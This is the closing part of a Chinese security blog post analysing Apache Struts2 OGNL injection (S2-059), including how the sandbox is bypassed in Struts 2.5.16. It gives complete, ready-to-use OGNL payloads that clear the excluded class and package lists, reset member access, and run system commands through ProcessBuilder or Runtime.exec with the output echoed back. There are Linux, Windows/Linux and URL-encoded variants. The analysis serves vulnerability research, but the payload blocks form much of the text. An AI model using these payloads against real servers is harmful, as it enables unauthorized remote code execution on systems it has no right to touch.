<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/2.png" alt="2"></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/3.png" alt="3"></p>
<p>一个是 ASTSequnce，一个则是 ASTChain，再看 checkEnableEvalExpression 函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkEnableEvalExpression</span><span class="params">(Object tree, Map&lt;String, Object&gt; context)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.enableEvalExpression &amp;&amp; <span class="keyword">this</span>.isEvalExpression(tree, context)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OgnlException(<span class="string">"Eval expressions/chained expressions have been disabled!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Eval expressions/chained expressions have been disabled!</code>，也就是说这里 ognl 会检查表达式是否可执行，而且 Eval expressions/chained expressions 两种形式的表达式被禁止</p>
<ul>
<li>ASTSequence <ul>
<li>表现形式： <code>#xxx=a, #yyy=b</code></li>
</ul>
</li>
<li>ASTEval    <ul>
<li>表现形式： <code>(#xxx)(#yyy)</code></li>
</ul>
</li>
<li>ASTChain <ul>
<li>表现形式： <code>#xxx.#yyy</code></li>
</ul>
</li>
</ul>
<p>所以要避免使用 ASTSequence 或 ASTEval 形式的 paylaod</p>
<p>Payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,&apos;id&apos;&#125;).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win+linux:</span><br><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;id&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Struct-2-5-16"><a href="#Struct-2-5-16" class="headerlink" title="Struct 2.5.16"></a>Struct 2.5.16</h3><p>因为禁止了对 context.map 的访问，所以通过<code>attr</code>  绕过，获取一个<code>context.map</code>，然后通过 setExcludedPackageNames 和 setExcludedClasses 将名单置空，再覆盖 <code>_memberAccess</code></p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%25%7B(%23context%3D%23attr%5B&apos;struts.valueStack&apos;%5D.context).(%23container%3D%23context%5B&apos;com.opensymphony.xwork2.ActionContext.container&apos;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.setExcludedClasses(&apos;&apos;)).(%23ognlUtil.setExcludedPackageNames(&apos;&apos;))%7D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%25%7B(%23context%3D%23attr%5B&apos;struts.valueStack&apos;%5D.context).(%23context.setMemberAccess(%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)).(%40java.lang.Runtime%40getRuntime().exec(&apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;))%7D</span><br><span class="line"></span><br><span class="line">有回显版：</span><br><span class="line">%25%7B(%23context%3D%23attr%5B&apos;struts.valueStack&apos;%5D.context).(%23context.setMemberAccess(%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)).(%23cmd%3D%7B&apos;%2Fbin%2Fbash&apos;%2C&apos;-c&apos;%2C&apos;id&apos;%7D).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmd)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)).(%23ros.flush())%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200818164601881.png" alt="image-20200818164601881"></p>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://javasec.org/javase/" target="_blank" rel="noopener">https://javasec.org/javase/</a></p>
<p><a href="https://seaii-blog.com/index.php/2019/12/29/90.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/90.html</a></p>
<p><a href="https://lucifaer.com/2019/01/16/浅析OGNL的攻防史/" target="_blank" rel="noopener">https://lucifaer.com/2019/01/16/%E6%B5%85%E6%9E%90OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2020/08/14/struct2-s2-059/">http://j0k3r.top/2020/08/14/struct2-s2-059/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/Struct2/">Struct2</a></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/17/MS Exchange Web/"><i class="fa fa-chevron-left">  </i><span>MS Exchange 常用攻击方法与 NSPI 拓展攻击面</span></a></div><div class="next-post pull-right"><a href="/2020/08/13/java-expression/"><span>Java EL （Expression Language）表达式注入</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/katou_01.model.json"},"display":{"superSample":2,"width":300,"height":600,"position":"left","hOffset":-20,"vOffset":-80},"log":false,"tagMode":false});</script></body></html>